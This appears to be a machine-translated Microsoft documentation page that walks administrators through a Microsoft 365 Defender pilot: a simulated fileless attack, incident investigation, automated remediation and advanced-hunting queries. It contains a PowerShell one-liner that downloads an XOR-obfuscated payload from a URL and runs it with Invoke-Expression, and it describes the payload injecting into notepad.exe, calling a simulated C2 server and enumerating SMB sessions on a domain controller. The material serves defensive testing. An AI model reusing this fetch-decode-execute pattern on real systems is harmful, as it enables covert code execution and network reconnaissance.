---
title: 執行您的 Microsoft 365 Defender 攻擊模擬
description: 針對您的 Microsoft 365 Defender 試驗專案執行攻擊模擬，以查看其攻擊方式並快速修復。
keywords: Microsoft 威脅防護試驗攻擊模擬、執行 Microsoft 威脅防護試驗攻擊模擬、在 Microsoft 威脅防護試驗專案、Microsoft 威脅防護試驗專案、網路安全性、進一步持續性威脅、企業安全性、裝置、裝置、身分識別、使用者、資料、應用程式、事件、自動化調查與補救、進一步搜尋中模擬攻擊
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: f1714eeeb30d1dd4c209d063604e1031369b5ddb
ms.sourcegitcommit: 855719ee21017cf87dfa98cbe62806763bcb78ac
ms.translationtype: MT
ms.contentlocale: zh-TW
ms.lasthandoff: 01/22/2021
ms.locfileid: "49933051"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a>執行您的 Microsoft 365 Defender 攻擊模擬

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|[![規劃](../../media/phase-diagrams/1-planning.png)](mtp-pilot-plan.md)<br/>[規劃](mtp-pilot-plan.md)|[![準備](../../media/phase-diagrams/2-prepare.png)](prepare-mtpeval.md)<br/>[製備](prepare-mtpeval.md)|![類比攻擊](../../media/phase-diagrams/3-simluate.png)<br/>類比攻擊|[![結束和摘要](../../media/phase-diagrams/4-summary.png)](mtp-pilot-close.md)<br/>[結束和摘要](mtp-pilot-close.md)|
|--|--|--|--|
|||*您目前在這裡！*||

您目前處於攻擊模擬階段。

準備您的試驗環境之後，就是測試 Microsoft 365 Defender 事件管理和自動化調查及補救功能的時候。 我們會説明您模擬複雜攻擊，利用進場技術隱藏偵測。 攻擊會列舉網網域控制站上已開啟 (SMB) 封鎖，並取回使用者裝置最近的 IP 位址。 此類型攻擊通常不包含放在下型裝置上的檔案，它們只發生在記憶內。 他們使用現有的系統及管理工具「住在大陸」，並且將程式碼插入系統程式以隱藏其執行，此類行為可讓他們偵測到病毒並持續在裝置上。

在這個模擬中，我們的範例案例是從 PowerShell 腳本開始。 使用者可能會被誘騙執行腳本。 或者，腳本可能從遠端連線到另一部電腦，從先前受到感染的裝置執行，即企圖稍後在網路中移動的攻擊者。 偵測這些腳本可能很困難，因為系統管理員通常也會遠端執行腳本，以執行各種系統管理活動。

![具有程式啟動和 SMB 重新連接攻擊圖表的無檔案 PowerShell 攻擊](../../media/mtp/mtpdiydiagram.png)

在模擬期間，攻擊會插入模擬流程的殼層。 此情境需要使用notepad.exe。 我們選擇此程式進行模擬，但攻擊者可能會以較久執行系統程式為目標，例如svchost.exe。 接著，Shellcode 會聯絡攻擊者的 C2 (控制命令) 伺服器，以接收如何繼續進行的指示。 腳本會嘗試對 DC (執行重新執行) 。 重新建立可讓攻擊者取得最近使用者登入資訊的資訊。 一旦攻擊者取得這些資訊，他們就可以在網路稍後移動，以取得特定的機密帳戶

> [!IMPORTANT]
> 為獲得最佳結果，請盡可能遵循攻擊模擬指示。

## <a name="simulation-environment-requirements"></a>模擬環境需求

由於在準備階段期間已經配置您的試驗環境，因此請為此情境確保您有兩部裝置：一個測試裝置和一個網域控制站。

1. 驗證您的租使用者[已啟用 Microsoft 365 Defender。](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)

2. 確認您的測試網域控制站組組：

   - 裝置使用 Windows Server 2008 R2 或更新版本執行。
   - 測試網域控制站至 [Microsoft Defender 進行身分識別，](https://docs.microsoft.com/azure/security-center/security-center-wdatp) 並啟用 [遠端系統管理](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)。
   - 確認已啟用[身分識別與 Microsoft Cloud App 安全性整合的 Microsoft Defender。](https://docs.microsoft.com/cloud-app-security/mdi-integration)
   - 您的網域上已建立測試使用者，不需要系統管理員許可權。

3. 確認測試裝置組配置：

   1. 裝置使用 Windows 10 版本 1903 或更新版本執行。

   1. 測試裝置已加入測試網域。

   1. [開啟 Windows Defender 防毒軟體](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。 如果您無法啟用 Windows Defender 防毒軟體，請參閱此 [疑難排解主題](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。

   1. 確認測試裝置已上[線至 Microsoft Defender for Endpoint) 。](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)

如果您使用現有的租使用者及執行裝置群組，請為測試裝置建立專用的裝置群組，然後推至組式 UX 中的最上方層級。

## <a name="run-the-attack-scenario-simulation"></a>執行攻擊案例模擬

若要執行攻擊案例模擬：

1. 使用測試使用者帳戶登入測試裝置。

2. 在測試裝置上開啟 Windows PowerShell 視窗。

3. 複製下列模擬腳本：

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > 如果您是在網頁瀏覽器上開啟這份檔，可能無法複製完整文字而不會失去特定字元，或是分行符號。 下載這份檔，然後以 Adobe Reader 開啟。

4. 當系統提示時，貼上及執行複製的腳本。

> [!NOTE]
> 如果您是使用遠端桌面通訊協定 (RDP) 執行 PowerShell，請使用 RDP 用戶端中的 [類型剪貼本文字> 命令，因為 **CTRL-V** Hotkey 或滑鼠右鍵貼上方法可能無法運作。 最新版本的 PowerShell 有時候也不接受這個方法，您可能需要先在記憶體中複製到記事本、在虛擬機器中複製，然後再貼到 PowerShell 中。

幾秒之後，系統 <i>notepad.exe</i> 開啟。 模擬攻擊代碼會插入notepad.exe。 讓自動產生的記事本實例保持開啟，以體驗完整的案例。

模擬攻擊代碼會嘗試通訊到外部 IP 位址 (模擬 C2 伺服器) 然後嘗試透過 SMB 重新對網域控制站重新執行。

腳本完成時，PowerShell 主控台上會顯示一則訊息。

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

若要看到自動化事件和回應功能作用中，請保持程式notepad.exe開啟。 您將會看到自動化事件和回應停止記事本程式。

## <a name="investigate-an-incident"></a>調查事件

> [!NOTE]
> 在我們將您進行這項模擬之前，請觀看下列影片，瞭解事件管理如何協助您將相關警示一起放在一起，做為調查流程的一部分、您可以在入口網站找到它的地方，以及事件管理如何協助您的安全性作業：

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

切換至 SOC 分析師觀點後，您現在就可以在 Microsoft 365 資訊安全中心入口網站開始調查攻擊。

1. 從任何 [裝置開啟 Microsoft 365 資訊安全中心入口](https://security.microsoft.com/incidents) 網站事件佇列。

2. 從功能表 **流覽** 至事件。

    ![顯示在 Microsoft 365 資訊安全中心的左側功能表上的事件螢幕擷取畫面](../../media/mtp/fig1.png)

3. 模擬攻擊的新事件會顯示在事件佇列中。

    ![事件佇列的螢幕擷取畫面](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a>以單一事件調查攻擊

Microsoft 365 Defender 會關聯分析，並將不同產品的所有相關警示與調查匯總到單一事件實體。 如此一來，Microsoft 365 Defender 會顯示更廣泛的攻擊案例，讓 SOC 分析師瞭解並回應複雜的威脅。

此模擬期間產生的警示會與相同的威脅相關聯，因此會自動匯總為單一事件。

若要查看事件：

1. 流覽至 **事件佇列** 。

   ![流覽功能表中的事件螢幕擷取畫面](../../media/mtp/fig1.png)

2. 按一下事件名稱左側的圓圈，以選取最新的專案。 側邊面板會顯示事件的其他相關資訊，包括所有相關的警示。 根據事件包含的警示屬性，每個事件都有一個描述它的唯一名稱。

   ![在模擬期間匯總產生警示的事件頁面螢幕擷取畫面](../../media/mtp/fig4.png)

   儀表板上顯示警示會依據服務資源進行篩選：Microsoft Defender for Identity、Microsoft Cloud App Security、Microsoft Defender for Endpoint、Microsoft 365 Defender 和 Microsoft Defender for Office 365。

3. 選取 **開啟事件頁面** 以取得事件詳細資訊。

   在 **事件** 頁面中，您可以看見所有警示與事件相關資訊。 這些資訊包括與警示相關的實體和資產、警示 (Microsoft Defender 的身分識別、EDR) 的偵測來源，以及它們連結的原因。 查看事件警示清單會顯示攻擊的進度。 您可以在此視圖中查看及調查個別警示。

   您也可以從 **右側功能表按一下** [管理事件;以標記事件、將事件指派給自己，以及新增批註。

   ![螢幕擷取畫面顯示按一下 [管理事件的地方](../../media/mtp/fig5a.png)

   ![管理事件面板上的欄位螢幕擷取畫面，您可以在其中標記事件、將事件指派給自己，以及新增批註 ](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a>查看產生的警示

讓我們看看在模擬攻擊期間產生的一些警示。

> [!NOTE]
> 我們只會流覽模擬攻擊期間產生的一些警示。 根據 Windows 版本和在測試裝置上執行之 Microsoft 365 Defender 產品的不同，您可能會看到更多以稍微不同的順序顯示警示。

![產生警示的螢幕擷取畫面](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a>警示：觀察的可疑 (來源：Microsoft Defender for Endpoint EDR) 

進手的入侵者會使用複雜且複雜的方法來保存記憶，並隱藏在偵測工具中。 其中一個常見技巧是在信任的系統程式內操作，而不是惡意執行檔，使得偵測工具和安全性作業難以發現惡意程式碼。

為了讓 SOC 分析師能夠發現這些進層攻擊，Microsoft Defender for Endpoint 中的深度記憶體感應器可讓我們的雲端服務非常深入地瞭解各種跨程式碼編碼技巧。 下圖顯示當嘗試插入程式碼給端點時，Defender for Endpoint 如何偵測<i>notepad.exe。</i>

![可能惡意程式碼的警示之螢幕擷取畫面](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a>提醒：在來源中，程式執行時所觀察的未預期行為 (來源：Microsoft Defender for Endpoint EDR) 

端點偵測的 Microsoft Defender 通常會以攻擊技術最常見的屬性為目標。 這個方法可確保工作十分簡單，並針對攻擊者提高策略，以利切換至較新的策略。

我們採用大規模學習演算法，以建立組織內及全球常見程式的正常行為，並注意這些程式何時會顯示異常行為。 這些異常行為通常表示系統引入多餘的程式碼，且是在其他信任的過程中執行。

在此情境中，notepad.exe與 <i> 外部 </i> 位置進行通訊時，發生異常行為。 此結果與用於引入和執行惡意程式碼的特定方法無關。

> [!NOTE]
> 由於此警示是以需要額外後端處理的機器學習模型為基礎，您可能需要一些時間，才能在入口網站看到此提醒。

請注意，警示詳細資料包括外部 IP 位址，這是您可以做為展開調查的樞紐分析表。

選取警示程式樹狀結構中的 IP 位址，以查看 IP 位址詳細資料頁面。

![在沒有任何命令列引數的情況下執行程式時出現意外行為之警示的螢幕擷取畫面](../../media/mtp/fig8.png)

下圖顯示選取的 IP 位址詳細資料頁面， (通知程式樹狀結構中的 IP 位址) 。
![IP 位址詳細資料頁面的螢幕擷取畫面](../../media/mtp/fig9.png)

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>提醒：SMB 使用者與 IP 位址的 (性)  (來源：Microsoft Defender 處理身分識別) 

使用伺服器訊息封鎖 (SMB) 通訊協定列舉可讓攻擊者取得最新的使用者登入資訊，協助他們稍後在網路中移動以存取特定機密帳戶。

在此偵測中，當 SMB 會話列舉對網域控制站執行時，會觸發警示。

![使用者和 IP 位址重新執行之 Microsoft Defender 身分識別警示的螢幕擷取畫面](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a>檢查裝置時程表 [端點的 Microsoft Defender]

流覽此事件的各種警示之後，流覽回您先前調查的事件頁面。 選取事件 **頁面中** 的裝置分頁，以審查由 Microsoft Defender for Endpoint 和 Microsoft Defender 針對身分識別所報告參與此事件的裝置。

選取受到攻擊的裝置名稱，以開啟該特定裝置的實體頁面。 您可以在該頁面中查看觸發警示和相關事件。

選取時程表 **Tab** 以開啟裝置時程表，並按時間順序查看裝置上所觀察的所有事件和行為，並隨警示一起顯示。

![具有行為之裝置時程表的螢幕擷取畫面](../../media/mtp/fig11.png)

展開一些更有趣的行為可提供有用的詳細資料，例如程式樹。

例如，向下卷卷，直到您找到觀察到 **的可疑事件可疑程式**。 選取powershell.exe **插入** notepad.exe事件，以在側邊窗格的事件實體圖形下方顯示此行為的完整程式樹狀結構。  如有需要，請使用搜尋欄進行篩選。

![選取的 PowerShell 檔案建立行為之程式樹的螢幕擷取畫面](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>檢查使用者資訊 [Microsoft Cloud App 安全性]

在事件頁面上，選取 **使用者分頁以顯示** 參與攻擊的使用者清單。 表格包含每個使用者的其他相關資訊，包括每個使用者的調查 **優先順序分數。**

選取使用者名稱以開啟可進行進一步調查的使用者設定檔頁面。 [進一步閱讀有關調查有風險的使用者。](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify)

![雲端 App 安全性使用者頁面的螢幕擷取畫面](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a>自動化調查與補救措施

> [!NOTE]
>在我們將您進行這項模擬之前，請觀看下列影片，熟悉什麼是自動自助、在入口網站何處找到，以及它如何協助您的安全性作業：

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

流覽回 Microsoft 365 資訊安全中心入口網站中的事件。 在 **事件頁面中** 的Microsoft Defender顯示由 Microsoft Defender for Identity 和 Microsoft Defender for Endpoint 所觸發的自動化調查。  以下螢幕擷取畫面只顯示 Defender for Endpoint 所觸發的自動化調查。 根據預設，端點的 Defender 會自動修復佇列中找到的完成品，需要修復。

![與事件相關的自動化調查螢幕擷取畫面](../../media/mtp/fig14.png)

選取觸發調查的警示，以開啟調查 **詳細資料** 頁面。 您將看見下列詳細資料：

- 提醒 () 自動調查的警示。
- 受到影響的使用者和裝置。 如果您在其他裝置上找到指示器，也會列出這些額外的裝置。
- 證據清單。 找到並分析的實體，例如檔案、程式、服務、驅動程式和網路位址。 會針對警示的可能關聯性分析這些實體，並評分為惡意或惡意。
- 發現威脅。 在調查期間發現已知的威脅。

> [!NOTE]
> 視時間不同，自動化調查可能仍在執行中。 請稍候幾分鐘，讓程式完成，然後再收集並分析證據並審查結果。 重新檢查 **調查詳細** 資料頁面以取得最新結果。

![調查詳細資料頁面的螢幕擷取畫面](../../media/mtp/fig15.png)

在自動化調查期間，Microsoft Defender for Endpoint notepad.exe程式，此程式是需要修復的其中一個加工品。 端點的 Defender 會自動停止可疑程式處理，做為自動化補救的一部分。

您可以在測試 <i> 裝置上 </i>notepad.exe程式清單中消失。

## <a name="resolve-the-incident"></a>解決事件

完成調查並確認要修復之後，請關閉事件。

選取 **管理事件**。 設定狀態以解決 **事件，** 然後選取相關的分類。

當事件解決時，它會關閉 Microsoft 365 資訊安全中心及相關入口網站中所有相關聯的警示。

![事件頁面的螢幕擷取畫面，開啟 [管理事件面板，您可以在其中按一下開關以解決事件](../../media/mtp/fig16.png)

這適合針對事件管理和自動化調查及補救案例進行攻擊模擬。 下一個模擬將可採取主動威脅尋找潛在惡意檔案的威脅。

## <a name="advanced-hunting-scenario"></a>進位搜尋案例

> [!NOTE]
> 在我們進行模擬之前，請觀看下列影片以瞭解進位的搜尋概念、查看您可以在入口網站找到它的地方，並瞭解它如何協助您的安全性作業：

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>搜尋環境需求

此情境需要一個內部信箱和裝置。 您也需要外部電子郵件帳戶來傳送測試郵件。

1. 確認您的租使用者已啟用[Microsoft 365 Defender。](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)
2. 找出要用來接收電子郵件的目標信箱。
    a. Microsoft Defender for Office 365 b 必須監控此信箱。 需求 3 的裝置必須存取此信箱
3. 設定測試裝置：a。 請確認您使用的是 Windows 10 版本 1903 或更新版本。
    b. 將測試裝置加入測試網域。
    c. [開啟 Windows Defender 防毒軟體](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。 如果您無法啟用 Windows Defender 防毒軟體，請參閱 [此疑難排解主題](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。
    d. [上線至 Microsoft Defender for Endpoint。](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)

### <a name="run-the-simulation"></a>執行模擬

1. 從外部電子郵件帳戶，傳送電子郵件到測試環境需求一節步驟 2 所識別的信箱。 包含可透過任何現有電子郵件篩選策略允許的附件。 此檔案不需要是惡意的或可執行檔。 建議的檔案類型為<i>.pdf、.exe</i> (如果允許) ，或 Office 檔 ，例如 Word 檔案。 <i></i>
2. 從測試環境需求一節步驟 3 所定義的裝置開啟已送出的電子郵件。 開啟附件或將檔案儲存到裝置。

#### <a name="go-hunting"></a>搜尋

1. 開啟 security.microsoft.com 入口網站。

2. 流覽至 **搜尋>進進搜尋**。

   ![M365 資訊安全中心入口網站流覽欄中進位搜尋的螢幕擷取畫面](../../media/mtp/fig17.png)

3. 建立從收集電子郵件事件開始查詢。

   1. 從查詢窗格中，選取新增。

   1. 從架構按兩下 EmailEvents 資料表。

      ```console
      EmailEvents
      ```

   1. 將時間範圍變更為過去 24 小時。 假設您執行上述模擬時所送出的電子郵件是在過去 24 小時進行，否則會變更時間範圍。

      ![螢幕擷取畫面顯示您可以變更時間範圍的地方。 開啟下拉式功能表，從時間範圍選項的範圍中選擇](../../media/mtp/fig18.png)

   1. 執行查詢。 視試驗環境的不同，可能有許多結果。

      > [!NOTE]
      > 請參閱下一個步驟來篩選選項以限制資料回電。

      ![進位搜尋查詢結果的螢幕擷取畫面](../../media/mtp/fig19.png)

        > [!NOTE]
        > 進位搜尋會以表格式資料顯示查詢結果。 您也可以選擇以其他格式類型來查看資料，例如圖表。

   1. 查看結果，看看您是否可以識別您開啟的電子郵件。 訊息最多可能需要 2 小時的時間，才能在進一次搜尋中顯示。 如果電子郵件環境很大且有許多結果，您可能會想要使用顯示篩選 **選項來尋找** 郵件。

      在範例中，電子郵件是由 Yahoo 帳戶所寄發。 按一下 **+** SenderFromDomain **區yahoo.com** 旁邊圖示，然後按一下 [Apply 鍵以將選取的網域新增到查詢中。 在執行模擬的步驟 1 中，使用用來傳送測試訊息的網域或電子郵件帳戶來篩選結果。 再次執行查詢以取得較小的結果集，以確認您看到模擬中的訊息。

      ![篩選的螢幕擷取畫面。 使用篩選縮小搜尋範圍，以更快找到您正在尋找的內容。](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. 按一下查詢產生的資料列，以便檢查記錄。

      ![選取進位搜尋結果時開啟的檢查記錄側邊面板的螢幕擷取畫面](../../media/mtp/fig21.png)

4. 現在，您確認可以看到電子郵件，請新增附件的篩選。 專注于環境中具有附件的所有電子郵件。 在這個情境中，焦點會放在內送電子郵件，而不是從您環境送出的電子郵件。 移除您為了尋找郵件而新增的任何篩選，並新增「|其中 **AttachmentCount > 0** 和 **EmailDirection**  ==  **"Inbound""**

   下列查詢會顯示比初始電子郵件事件之查詢更短的結果：

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. 接下來，請包含附件清單 (例如：檔案名、雜湊) 至結果集。 若要這麼做，請加入 **EmailAttachmentInfo 資料** 表。 連接時常用的欄位為 **NetworkMessageId** 和 **RecipientObjectId。**

   下列查詢也包含另一行「查詢| **project-rename EmailTimestamp=Timestamp**"，可協助識別哪一個時間戳記與您將在下一個步驟中新增之檔案動作的相關電子郵件與時間戳記相關。

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. 接下來，使用 **EmailAttachmentInfo** 表格中的 **SHA256** 值，尋找該雜湊 (端點上發生的 **DeviceFileEvents**) 動作。 此處常用的欄位為附件的 SHA256 雜湊。

   結果表格現在包含端點 (Microsoft Defender for Endpoint) 的詳細資訊，例如裝置名稱、在此案例中執行的動作 (、篩選為只包含 FileCreaed 事件) ，以及檔案儲存的位置。 與程式關聯的帳戶名稱也會包含在內。

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   您現在已建立一個查詢，該查詢會識別使用者開啟或儲存附件的所有輸入電子郵件。 您也可以縮小此查詢的篩選範圍，以篩選特定的寄件者網域、檔案大小、檔案類型等等。

7. 函數是一種特殊的連線類型，它讓您能提取更多有關檔案的 TI 資料，例如檔案的發行者、簽號者和發行者資訊等。若要取得檔案的更多詳細資料，請使用 **FileProfile 函數 ()** 函數擴充：

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a>建立偵測

一旦建立查詢來識別未來要收到警示的資訊後，就可以從查詢建立自訂偵測。

自訂偵測會根據您的設定頻率執行查詢，而查詢結果會根據您的選擇的影響資產建立安全性警訊。 這些警示會與事件相關，可分類為其中一項產品所產生的任何其他安全性警示。

1. 在查詢頁面上，移除執行搜尋指示步驟 7 中新增的第 7 行和 8 行，然後按一下 [建立 **偵測規則**。

   ![螢幕擷取畫面顯示您可以在進一步搜尋頁面中按一下建立偵測規則](../../media/mtp/fig22.png)

   > [!NOTE]
   > 如果您按一下 [ **建立偵測規則** ，且查詢中出現語法錯誤，您的偵測規則將不會儲存。 請檢查您的查詢，以確保沒有錯誤。

2. 填寫所需欄位的資訊，以便讓安全小組瞭解警示、產生的原因，以及您預期他們採取的動作。

   ![您可以在其中定義警示詳細資料之建立偵測規則頁面的螢幕擷取畫面](../../media/mtp/fig23.png)

   請確定您明確填寫欄位，協助下一個使用者做出有關此偵測規則通知的明智的決策

3. 選取此警示中會影響哪些實體。 在此案例中，請選取 **裝置和****信箱**。

   ![建立偵測規則頁面的螢幕擷取畫面，您可以在其中選擇受影響實體的參數](../../media/mtp/fig24.png)

4. 決定觸發警示時應該採取的行動。 在這種情況下，請執行防毒軟體掃描，但可能會採取其他動作。

   ![建立偵測規則頁面的螢幕擷取畫面，您可以在觸發警示來協助處理威脅時執行防毒掃描](../../media/mtp/fig25.png)

5. 選取警示規則的範圍。 由於此查詢涉及裝置，因此根據 Microsoft Defender for Endpoint 內容，裝置群組在此自訂偵測中是相關的。 建立不包含裝置作為影響實體的自訂偵測時，範圍不適用。

   ![建立偵測規則頁面的螢幕擷取畫面，您可以在此設定警示規則的範圍，以管理您預期看到的結果](../../media/mtp/fig26.png)

   針對此試驗，您可能會想要將這項規則限制為您生產環境中測試裝置子集。

6. 選取 [建立]。 然後，從 **流覽面板中選取** 自訂偵測規則。

   ![功能表中自訂偵測規則選項的螢幕擷取畫面](../../media/mtp/fig27a.png)

   ![顯示規則與執行詳細資料之偵測規則頁面的螢幕擷取畫面](../../media/mtp/fig27b.png)

   在此頁面上，您可以選取偵測規則，以開啟詳細資料頁面。

   ![電子郵件附件頁面的螢幕擷取畫面，您可以在此查看規則執行、觸發警示和動作、編輯偵測等狀態](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a>其他進一步搜尋的練習

若要深入瞭解進一步搜尋，下列網路將會流覽 Microsoft 365 Defender 內進一步搜尋的功能，以建立交叉資料欄查詢、樞紐分析至實體，以及建立自訂偵測和補救動作。

> [!NOTE]
> 使用您自己的 GitHub 帳戶做好準備，以在試驗測試實驗室環境中執行搜尋查詢。

|職稱|說明|下載 MP4|在 YouTube 上觀看|使用的 CSL 檔案|
|---|---|---|---|---|
|第 1 集：KQL 基礎|我們將涵蓋 Microsoft 365 Defender 中進位搜尋功能的一些基礎功能。 瞭解可用的進位搜尋資料和基本 KQL 語法及運算子。|[MP4](https://aka.ms/MTP15JUL20_MP4)|[Youtube](https://youtu.be/0D9TkGjeJwM)|[第 1 集：Git 中的 CSL 檔案](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|第 2 集：加入|我們會繼續學習進入搜尋的資料，以及如何將表格連接在一起。 瞭解內部、外部、唯一和半聯聯，以及預設 Kusto innerunique 聯聯的細微之處。|[MP4](https://aka.ms/MTP22JUL20_MP4)|[Youtube](https://youtu.be/LMrO6K5TWOU)|[第 2 集：Git 中的 CSL 檔案](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|第 3 集：摘要、樞紐分析及視覺化資料|現在，我們能夠篩選、操作及連接資料，是時候開始進行摘要、量化、樞紐分析及視覺化了。 在此集中，我們會涵蓋摘要運算子和一些您可以在進一步搜尋架構的其他資料表時執行的計算。 我們將資料集轉換成圖表，協助改善分析。|[MP4](https://aka.ms/MTP29JUL20_MP4)|[Youtube](https://youtu.be/UKnk9U1NH6Y)|[第 3 集：Git 中的 CSL 檔案](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|第 4 集：讓我們來搜尋吧！ 將 KQL 應用至事件追蹤|該追蹤一些攻擊者的活動了！ 在這段集中，我們將使用 Microsoft 365 Defender 中進一步瞭解 KQL 和進一步搜尋來追蹤攻擊。 瞭解在欄位中用來追蹤攻擊者活動的一些秘訣和訣竅，包括網路安全性的 ABC，以及如何將它們套用至事件回應。|[MP4](https://aka.ms/MTP5AUG20_MP4)|[Youtube](https://youtu.be/2EUxOc_LNd8)|[第 4 集：Git 中的 CSL 檔案](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a>下一步

|![結案和摘要階段](../../media/mtp/close.png) <br>[結案和摘要階段](mtp-pilot-close.md)|分析您的 Microsoft 365 Defender 試驗結果，向專案關係人呈現，然後進行下一個步驟。
|:-----|:-----|
